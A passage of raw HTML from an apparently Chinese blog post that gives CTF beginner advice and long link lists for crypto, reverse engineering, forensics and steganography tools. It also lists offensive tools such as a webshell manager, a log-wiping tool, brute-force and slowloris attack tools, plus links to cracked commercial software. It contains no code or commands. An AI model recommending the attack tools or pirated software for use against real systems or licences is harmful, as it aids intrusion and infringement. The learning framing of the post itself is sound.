href="https://links.jianshu.com/go?to=http%3A%2F%2Frumkin.com%2Ftools%2Fcipher%2F" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/</a></p><p>文本加密为汉字(“盲文”，音符，各种语言，花朵，箭头…):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.qqxiuzi.cn%2Fbianma%2Fwenbenjiami.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/wenbenjiami.php</a></p><p>在线繁体字转换器:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.aies.cn" target="_blank" rel="noopener">http://www.aies.cn</a></p><p>在线工具集合:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Ftomeko.net%2Fonline_tools%2F" target="_blank" rel="noopener">http://tomeko.net/online_tools/</a></p><p>二维码/条形码:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fonline-barcode-reader.inliteresearch.com%2F" target="_blank" rel="noopener">https://online-barcode-reader.inliteresearch.com/</a></p><p>生成二维码:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wwei.cn%2F" target="_blank" rel="noopener">http://www.wwei.cn/</a></p><p>在线二维码解密:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fjiema.wwei.cn%2F" target="_blank" rel="noopener">http://jiema.wwei.cn/</a></p><p>Image2Base64:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vgot.net%2Ftest%2Fimage2base64.php" target="_blank" rel="noopener">http://www.vgot.net/test/image2base64.php</a></p><p>与佛论禅:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.keyfc.net%2Fbbs%2Ftools%2Ftudoucode.aspx" target="_blank" rel="noopener">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p><p>在线分解GIF帧图:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fzh.bloggif.com%2Fgif-extract" target="_blank" rel="noopener">http://zh.bloggif.com/gif-extract</a></p><p>bejson(杂乱):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.bejson.com" target="_blank" rel="noopener">http://www.bejson.com</a></p><p>atool(杂乱):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.atool.org" target="_blank" rel="noopener">http://www.atool.org</a></p><p>PunchCard:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.kloth.net%2Fservices%2Fcardpunch.php" target="_blank" rel="noopener">http://www.kloth.net/services/cardpunch.php</a></p><p>分解素数(ESA):<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.factordb.com%2Findex.php" target="_blank" rel="noopener">http://www.factordb.com/index.php</a></p><p>文件在线Hash:<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.atool.org%2Ffile_hash.php" target="_blank" rel="noopener">http://www.atool.org/file_hash.php</a><br> pwn程序的逻辑分析，漏洞利用windows、linux、小型机等<br> misc杂项，隐写，数据还原，脑洞、社会工程、与信息安全相关的大数据<br> reverse逆向windows、linux类<br> ppc编程类的</p><p>国内外著名比赛</p><p>国外：<br> 国内：xctf联赛0ctf上海国内外都有，很强</p><p>入门需要哪些基础：</p><p>1.编程语言基础（c、汇编、脚本语言）<br> 2.数学基础（算法、密码学）<br> 3.脑洞大开（天马行空的想象、推理解密）<br> 4.体力耐力（通宵熬夜）</p><p>如何入门学</p><p>1.恶补基础知识<br> 2.尝试从脑洞开始如黑客game<br> 3.从基础题出发一般都是100，200，最高分在500，600先把100分的学好，可从实践，高中的ctf学起，比较简单，只涉及1，2个点<br> 4.学信息安全专业知识<br> 5.锻炼体力耐力周六日都有比赛</p><p>到底如何学？</p><p>1.分析赛题情况<br> 2.分析自身能力自己最适合哪个方向<br> 3.选择更适合的入手</p><p>分析赛题</p><p>PWN、Reverse偏重对汇编、逆向的理解对底层理解<br> Crypto偏重对数学、算法的深入学习密码课要深入学<br> Web偏重对技巧沉淀、快速搜索能力的挑战发散思维，对底层只需要了解，代码原理，关于漏洞点的积累<br> Misc则更复杂，所有与计算机安全挑战有关的都在其中隐写，图片数据分析还原，流量，大数据，对游戏分析逆向</p><p>常规做法：</p><p>A方向：PWN+Reverse+Crypto随机搭配<br> B方向：Web+Misc组合<br> Misc所有人都可以做</p><p>入门知识：</p><p>都要学的内容：linux基础、计算机组成原理、操作系统原理、网络协议分析</p><p>A方向：IDA工具使用（fs插件）、逆向工程、密码学、缓冲区溢出等<br> B方向：Web安全、网络安全、内网渗透、数据库安全等前10的安全漏洞</p><p>推荐书：</p><p>A方向：</p><p>REforBeginners<br> IDAPro权威指南<br> 揭秘家庭路由器0day漏洞挖掘技术<br> 自己定操作系统<br> 黑客攻防技术宝典：系统实战篇有各种系统的逆向讲解</p><p>B方向：</p><p>Web应用安全权威指南最推荐小白，宏观web安全<br> Web前端黑客技术揭秘<br> 黑客秘籍——渗透测试实用指南<br> 黑客攻防技术宝典web实战篇web安全的所有核心基础点，有挑战性，最常规，最全，学好会直线上升<br> 代码审计：企业级web代码安全架构</p><p>入门—-从基础题目出发（推荐资源）：</p><p><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fctf.idf.cn" target="_blank" rel="noopener">http://ctf.idf.cn</a>!!!首推idf实验室：题目非常基础，只1个点<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ichunqiu.com" target="_blank" rel="noopener">www.ichunqiu.com</a>有线下决赛题目复现<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Foj.xctf.org.cn%2Fxctf" target="_blank" rel="noopener">http://oj.xctf.org.cn/xctf</a>题库网站，历年题，练习场，比较难<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wechall.net%2Fchalls" target="_blank" rel="noopener">www.wechall.net/challs</a>!!!!!!非常入门的国外ctf题库，很多国内都是从这里刷题成长起来的<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fcanyouhack.it%2F" target="_blank" rel="noopener">http://canyouhack.it/</a>国外，入门，有移动安全<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmicrocorruption.com%2FloginA" target="_blank" rel="noopener">https://microcorruption.com/loginA</a>方向密码，逆向酷炫游戏代<br> http：//smashthestack.orgA方向，简洁，国外，wargames，过关<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Foverthewire.ofg%2Fwargames%2F" target="_blank" rel="noopener">http://overthewire.ofg/wargames/</a>！！！！推荐A方向国内资料多，老牌wargame<br> https：//exploit-exercises.comA方向老牌wargame，国内资料多<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fpawnable.kr%2Fplay.phppwn" target="_blank" rel="noopener">http://pawnable.kr/play.phppwn</a>类游乐场，不到100题<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fctf.moonsoscom%2Fpentest%2Findex.phpB" target="_blank" rel="noopener">http://ctf.moonsoscom/pentest/index.phpB</a>方向米安的Web漏洞靶场，基础，核心知识点<br> http：//prompt.ml/0B方向国外的xss测试<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fredtiger.labs.overthewire.org%2FB" target="_blank" rel="noopener">http://redtiger.labs.overthewire.org/B</a>方向国外sql注入挑战网站，10关，过关的形式不同的注入，循序渐近地练习</p><p>工具：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Ftruongkma%2Fctf-tools" target="_blank" rel="noopener">https://github.com/truongkma/ctf-tools</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FPlkachu%2Fv0lt" target="_blank" rel="noopener">https://github.com/Plkachu/v0lt</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fzardus%2Fctf-tools" target="_blank" rel="noopener">https://github.com/zardus/ctf-tools</a><br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FTUCTF%2FTools" target="_blank" rel="noopener">https://github.com/TUCTF/Tools</a></p><p>入门–以练促赛，以赛养练</p><p>选择一场已经存在writeup的比赛</p><p>总结解题过程，分析出题人想法</p><p>参加一场最新的ctf比赛<br> https：//ctftime.org/国际比赛，有很多基础的<br> http：<a href="https://links.jianshu.com/go?to=%2F%2Fwww.xctf.org.cn%2F" target="_blank" rel="noopener">//www.xctf.org.cn/</a>国内比赛，比较难<br> 以及一些ctf要用到的<br> 整合版：</p><p><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.jz5u.com%2FSoft%2FProgra%2Ftool%2F163275.html" target="_blank" rel="noopener">http://www.jz5u.com/Soft/Progra/tool/163275.html</a></p><p>各种在线工具以及工具整合</p><p><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ctftools.com%2F" target="_blank" rel="noopener">http://www.ctftools.com/</a></p><p>内网自动化渗透脚本<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FSecureThisShit%2FWinPwn" target="_blank" rel="noopener">https://github.com/SecureThisShit/WinPwn</a></p><p>一个初级内网渗透课程<br> 视频:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F13yBZg6DaaMP_dRo1XhKooA" target="_blank" rel="noopener">https://pan.baidu.com/s/13yBZg6DaaMP_dRo1XhKooA</a>提取码：aeko<br> PPT:<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F13r6dH0GBbsuLVFP4nTg5Yg" target="_blank" rel="noopener">https://pan.baidu.com/s/13r6dH0GBbsuLVFP4nTg5Yg</a>提取码：fuh8逆向工程:<br> GDB–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.gnu.org%2Fsoftware%2Fgdb%2Fdownload%2F" target="_blank" rel="noopener">http://www.gnu.org/software/gdb/download/</a><br> IDAPro–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.hex-rays.com%2Fproducts%2Fida%2Fsupport%2Fdownload.shtml" target="_blank" rel="noopener">https://www.hex-rays.com/products/ida/support/download.shtml</a><br> ImmunityDebugger–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fdebugger.immunityinc.com%2F" target="_blank" rel="noopener">http://debugger.immunityinc.com/</a><br> OllyDbg–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.ollydbg.de%2F" target="_blank" rel="noopener">http://www.ollydbg.de/</a><br> radare2–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.radare.org%2Fy%2F%3Fp%3Ddownload" target="_blank" rel="noopener">http://www.radare.org/y/?p=download</a><br> Hopper–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.hopperapp.com%2Fdownload.html" target="_blank" rel="noopener">http://www.hopperapp.com/download.html</a><br> nm–unix/linuxtool<br> objdump–linuxtool<br> strace–linuxtool<br> ILSpy–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Filspy.net%2F" target="_blank" rel="noopener">http://ilspy.net/</a><br> JD-GUI–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fjd.benow.ca%2F%23jd-gui-overview" target="_blank" rel="noopener">http://jd.benow.ca/#jd-gui-overview</a><br> FFDec–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.free-decompiler.com%2Fflash%2Fdownload.html" target="_blank" rel="noopener">http://www.free-decompiler.com/flash/download.html</a><br> dex2jar–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fcode.google.com%2Fp%2Fdex2jar%2F" target="_blank" rel="noopener">http://code.google.com/p/dex2jar/</a><br> uncompyle2–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fwibiti%2Funcompyle2" target="_blank" rel="noopener">https://github.com/wibiti/uncompyle2</a><br> Hexeditors:<br> Windows:<br> HxD–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fmh-nexus.de%2Fen%2Fhxd%2F" target="_blank" rel="noopener">http://mh-nexus.de/en/hxd/</a><br> Neo–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.new-hex-editor.com%2Fhex-editor-downloads.html" target="_blank" rel="noopener">http://www.new-hex-editor.com/hex-editor-downloads.html</a><br> Linux:<br> Bless–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fhome.gna.org%2Fbless%2Fdownloads.html" target="_blank" rel="noopener">http://home.gna.org/bless/downloads.html</a><br> wxHexEditor–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wxhexeditor.org%2Fdownload.php" target="_blank" rel="noopener">http://www.wxhexeditor.org/download.php</a><br> Exeunpackers–UnpackingKit2012–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fforum.exetools.com%2Fshowthread.php%3Ft%3D13610" target="_blank" rel="noopener">http://forum.exetools.com/showthread.php?t=13610</a></p><p>网络:<br> Wireshark,tshark–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.wireshark.org%2Fdownload.html" target="_blank" rel="noopener">https://www.wireshark.org/download.html</a><br> OpenVPN–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fopenvpn.net%2F" target="_blank" rel="noopener">https://openvpn.net/</a><br> OpenSSL–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.openssl.org%2Frelated%2Fbinaries.html" target="_blank" rel="noopener">https://www.openssl.org/related/binaries.html</a><br> tcpdump–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.tcpdump.org%2F" target="_blank" rel="noopener">http://www.tcpdump.org/</a><br> netcat–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fnetcat.sourceforge.net%2F" target="_blank" rel="noopener">http://netcat.sourceforge.net/</a><br> nmap–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fnmap.org%2Fdownload.html" target="_blank" rel="noopener">http://nmap.org/download.html</a></p><p>隐写:<br> OpenStego–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.openstego.info%2F" target="_blank" rel="noopener">http://www.openstego.info/</a><br> OutGuess–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.outguess.org%2Fdownload.php" target="_blank" rel="noopener">http://www.outguess.org/download.php</a><br> Steghide–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fsteghide.sourceforge.net%2Fdownload.php" target="_blank" rel="noopener">http://steghide.sourceforge.net/download.php</a><br> StegFS–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fsourceforge.net%2Fprojects%2Fstegfs%2F" target="_blank" rel="noopener">http://sourceforge.net/projects/stegfs/</a><br> pngcheck–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.libpng.org%2Fpub%2Fpng%2Fapps%2Fpngcheck.html" target="_blank" rel="noopener">http://www.libpng.org/pub/png/apps/pngcheck.html</a><br> GIMP–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.gimp.org%2Fdownloads%2F" target="_blank" rel="noopener">http://www.gimp.org/downloads/</a><br> Audacity–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Faudacity.sourceforge.net%2Fdownload%2F" target="_blank" rel="noopener">http://audacity.sourceforge.net/download/</a><br> MP3Stego–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.petitcolas.net%2Fsteganography%2Fmp3stego%2F" target="_blank" rel="noopener">http://www.petitcolas.net/steganography/mp3stego/</a><br> ffmpeg(forvideoanalysis)–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.ffmpeg.org%2Fdownload.html" target="_blank" rel="noopener">https://www.ffmpeg.org/download.html</a></p><p>电子取证:<br> dd–unix/linuxtool<br> strings–unix/linuxtool<br> scalpel–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsleuthkit%2Fscalpel" target="_blank" rel="noopener">https://github.com/sleuthkit/scalpel</a><br> TrID–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fmark0.net%2Fsoft-trid-e.html" target="_blank" rel="noopener">http://mark0.net/soft-trid-e.html</a><br> binwalk–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fbinwalk.org%2F" target="_blank" rel="noopener">http://binwalk.org/</a><br> foremost–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fforemost.sourceforge.net%2F" target="_blank" rel="noopener">http://foremost.sourceforge.net/</a><br> ExifTool–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sno.phy.queensu.ca%2F~phil%2Fexiftool%2F" target="_blank" rel="noopener">http://www.sno.phy.queensu.ca/~phil/exiftool/</a><br> DigitalForensicsFramework(DFF)–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.digital-forensic.org%2Fdownload%2F" target="_blank" rel="noopener">http://www.digital-forensic.org/download/</a><br> ComputerAidedINvestigativeEnvironment(CAINE)Linuxforensicslivedistribution–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.caine-live.net%2F" target="_blank" rel="noopener">http://www.caine-live.net/</a><br> TheSleuthKit(TSK)–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sleuthkit.org%2Fsleuthkit%2Fdownload.php" target="_blank" rel="noopener">http://www.sleuthkit.org/sleuthkit/download.php</a><br> Volatility–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fcode.google.com%2Fp%2Fvolatility%2F" target="_blank" rel="noopener">http://code.google.com/p/volatility/</a></p><p>编程以及编码工具/PPC:<br> Texteditors:<br> SublimeText–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sublimetext.com%2F" target="_blank" rel="noopener">http://www.sublimetext.com/</a><br> Notepad++–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fnotepad-plus-plus.org%2F" target="_blank" rel="noopener">http://notepad-plus-plus.org/</a><br> vim–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.vim.org%2F" target="_blank" rel="noopener">http://www.vim.org/</a><br> emacs–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.gnu.org%2Fsoftware%2Femacs%2F" target="_blank" rel="noopener">http://www.gnu.org/software/emacs/</a></p><p>密码学:<br> Cryptool–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.cryptool.org%2F" target="_blank" rel="noopener">https://www.cryptool.org/</a><br> hashpump–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fbwall%2FHashPump" target="_blank" rel="noopener">https://github.com/bwall/HashPump</a><br> Sage–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.sagemath.org%2F" target="_blank" rel="noopener">http://www.sagemath.org/</a><br> JohntheRipper–<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.openwall.com%2Fjohn%2F" target="_blank" rel="noopener">http://www.openwall.com/john/</a><br> xortool–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fhellman%2Fxortool" target="_blank" rel="noopener">https://github.com/hellman/xortool</a></p><p>在线工具:<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.crypo.com%2F" target="_blank" rel="noopener">http://www.crypo.com/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cryptool-online.org%2F" target="_blank" rel="noopener">http://www.cryptool-online.org/</a><br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Frumkin.com%2Ftools%2Fcipher%2F" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/</a><br> Modulesforpython–pycrypto–<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.dlitz.net%2Fsoftware%2Fpycrypto%2F" target="_blank" rel="noopener">https://www.dlitz.net/software/pycrypto/</a></p><p>cmd5:</p><p><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fpmd5.com%2F" target="_blank" rel="noopener">http://pmd5.com/</a></p><p><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cmd5.com%2F" target="_blank" rel="noopener">http://www.cmd5.com/</a></p><p>进制转换-<a href="https://links.jianshu.com/go?to=https%3A%2F%2Ftool.lu%2Fhexconvert" target="_blank" rel="noopener">https://tool.lu/hexconvert</a></p><p>在线运行代码-<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fc.runoob.com%2Fcompile%2F1" target="_blank" rel="noopener">https://c.runoob.com/compile/1</a><br> <strong>工具</strong><br> 秘迹：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fm.mijisou.com%2F" target="_blank" rel="noopener">https://m.mijisou.com/</a></p><p>在线病毒检测引擎：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.virscan.org%2F" target="_blank" rel="noopener">http://www.virscan.org/</a></p><p>云扫描病毒：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.scanvir.com%2F" target="_blank" rel="noopener">http://www.scanvir.com/</a></p><p>威胁情报分析平台：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fx.threatbook.cn%2Fpartner" target="_blank" rel="noopener">https://x.threatbook.cn/partner</a></p><p>WebShell检测引擎：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fscanner.baidu.com%2F" target="_blank" rel="noopener">https://scanner.baidu.com/</a></p><p>知道创宇：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fknownsec" target="_blank" rel="noopener">https://github.com/knownsec</a></p><p>Dm：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FDm2333" target="_blank" rel="noopener">https://github.com/Dm2333</a></p><p>EventCleaner：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2F360-A-Team%2FEventCleaner" target="_blank" rel="noopener">https://github.com/360-A-Team/EventCleaner</a></p><p>验证码识别库：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.wzdr.cn%2Farticle-534.html" target="_blank" rel="noopener">http://www.wzdr.cn/article-534.html</a></p><p>中国特色弱口令生成器：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FRicterZ%2FgenpAss" target="_blank" rel="noopener">https://github.com/RicterZ/genpAss</a></p><p>MSDN各种工具和服务器镜像：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmsdn.itellyou.cn%2F" target="_blank" rel="noopener">https://msdn.itellyou.cn/</a></p><p>C32asm最佳的静态反汇编软件：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.c32asm.com%2F" target="_blank" rel="noopener">http://www.c32asm.com/</a></p><p>PHP在线加解密网站：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.zhaoyuanma.com%2F" target="_blank" rel="noopener">http://www.zhaoyuanma.com/</a></p><p>K8工具合集：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fk8gege%2FK8tools" target="_blank" rel="noopener">https://github.com/k8gege/K8tools</a></p><p>WinAFL模糊测试工具：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fivanfratric%2Fwinafl" target="_blank" rel="noopener">https://github.com/ivanfratric/winafl</a></p><p>异步目标枚举工具：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fwelchbj%2Fbscan" target="_blank" rel="noopener">https://github.com/welchbj/bscan</a></p><p>开源扫描仪工具箱：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FWe5ter%2FScanners-Box" target="_blank" rel="noopener">https://github.com/We5ter/Scanners-Box</a></p><p>FCN：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fboywhp%2Ffcn" target="_blank" rel="noopener">https://github.com/boywhp/fcn</a></p><p>浏览器的PWN：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fm1ghtym0%2Fbrowser-pwn" target="_blank" rel="noopener">https://github.com/m1ghtym0/browser-pwn</a></p><p>高级威胁战术：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.cobaltstrike.com%2Ftraining" target="_blank" rel="noopener">https://www.cobaltstrike.com/training</a></p><p>风控预警平台：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fcreditease-sec%2Finsight" target="_blank" rel="noopener">https://github.com/creditease-sec/insight</a></p><p>暴力破解工具Hydra（九头蛇）：</p><p><a href="https://www.jianshu.com/p/e02ef0a00786" target="_blank" rel="noopener">https://www.jianshu.com/p/e02ef0a00786</a></p><p>万能密码字典：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwenku.baidu.com%2Fview%2Fd55f60e4c281e53a5902ff0d" target="_blank" rel="noopener">https://wenku.baidu.com/view/d55f60e4c281e53a5902ff0d</a></p><p>SubFinder是一个子域发现工具：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsubfinder%2Fsubfinder" target="_blank" rel="noopener">https://github.com/subfinder/subfinder</a></p><p>中国蚂剑：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FAntSwordProject%2FantSword%2Freleases" target="_blank" rel="noopener">https://github.com/AntSwordProject/antSword/releases</a></p><p>Windows-Exploit-Suggester：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FGDSSecurity%2FWindows-Exploit-Suggester" target="_blank" rel="noopener">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></p><p>构造优质上传漏洞fuzz字典：</p><p><a href="https://links.jianshu.com/go?to=http%3A%2F%2Fgv7.me%2Farticles%2F2018%2Fmake-upload-vul-fuzz-dic%2F" target="_blank" rel="noopener">http://gv7.me/articles/2018/make-upload-vul-fuzz-dic/</a></p><p>一款识别图形验证码的BurpSuite插件：</p><p><a href="https://www.jianshu.com/p/a0262883b751" target="_blank" rel="noopener">https://www.jianshu.com/p/a0262883b751</a></p><p>slowloris.py-Python中的简单slowloris：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fgkbrk%2Fslowloris" target="_blank" rel="noopener">https://github.com/gkbrk/slowloris</a></p><p>SharpSploit控制台：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fanthemtotheego%2FSharpSploitConsole" target="_blank" rel="noopener">https://github.com/anthemtotheego/SharpSploitConsole</a></p><p>研究个人编译APT恶意软件：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fsapphirex00%2FThreat-Hunting" target="_blank" rel="noopener">https://github.com/sapphirex00/Threat-Hunting</a></p><p>代理行动规则：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FPortSwigger%2Fproxy-action-rules" target="_blank" rel="noopener">https://github.com/PortSwigger/proxy-action-rules</a></p><p>SwitchHosts—快速切换主机：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Foldj%2FSwitchHosts" target="_blank" rel="noopener">https://github.com/oldj/SwitchHosts</a></p><p>Xshell6.0破解版本（绿色破解）：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdownload.csdn.net%2Fdownload%2Fqq_32589267%2F10792860" target="_blank" rel="noopener">https://download.csdn.net/download/qq_32589267/10792860</a></p><p>BurpSuite破解版（含注册机，无后门）：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fu014549283%2Farticle%2Fdetails%2F81248886" target="_blank" rel="noopener">https://blog.csdn.net/u014549283/article/details/81248886</a></p><p>x-pack-core-6.4.2破解版亲测可用：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdownload.csdn.net%2Fdownload%2Fczs208112%2F10718181" target="_blank" rel="noopener">https://download.csdn.net/download/czs208112/10718181</a></p><p>Wiki收集RedTeam基础架构强化资源：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fbluscreenofjeff%2FRed-Team-Infrastructure-Wiki" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a></p><p>应急响应工具大合集：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fmeirwah%2Fawesome-incident-response" target="_blank" rel="noopener">https://github.com/meirwah/awesome-incident-response</a></p><p>蜜罐：</p><p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2Fparalax%2Fawesome-honeypots%2Fblob%2Fmaster%2FREADME_CN.md" target="_blank" rel="noopener">https://github.com/paralax/awesome-honeypots/blob/master/README_CN.md</a></p><p>电子书籍：</p><p>安全思维导图集合：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FSecWiki%2Fsec-chart" target="_blank" rel="noopener">https://github.com/SecWiki/sec-chart</a><br> PHP编程：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fpan.baidu.com%2Fs%2F1ZvUdonJ_h3EYTfHIbjoe6A" target="_blank" rel="noopener">https://pan.baidu.com/s/1ZvUdonJ_h3EYTfHIbjoe6A</a><br> 代码审计入门：<a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.cnblogs.com%2FOran9e%2Fp%2F7763751.html" target="_blank" rel="noopener">http://www.cnblogs.com/Oran9e/p/7763751.html</a><br> 墨者学院审计类通关指南：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fxz.aliyun.com%2Ft%2F2821" target="_blank" rel="noopener">https://xz.aliyun.com/t/2821</a><br> IT畅销电子书：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.packtpub.com%2F" target="_blank" rel="noopener">https://www.packtpub.com/</a></p><p>资源网站：<br> KaliLinux渗透测试：<br> <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F8UcU7R803k3gcextswzGlQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/8UcU7R803k3gcextswzGlQ</a><br> Oday安全：<br> <a href="https://links.jianshu.com/go?to=http%3A%2F%2Fwww.0daysecurity.com%2Fpenetration-testing%2Fenumeration.html" target="_blank" rel="noopener">http://www.0daysecurity.com/penetration-testing/enumeration.html</a><br> IT资料搜寻网站：<br> <a 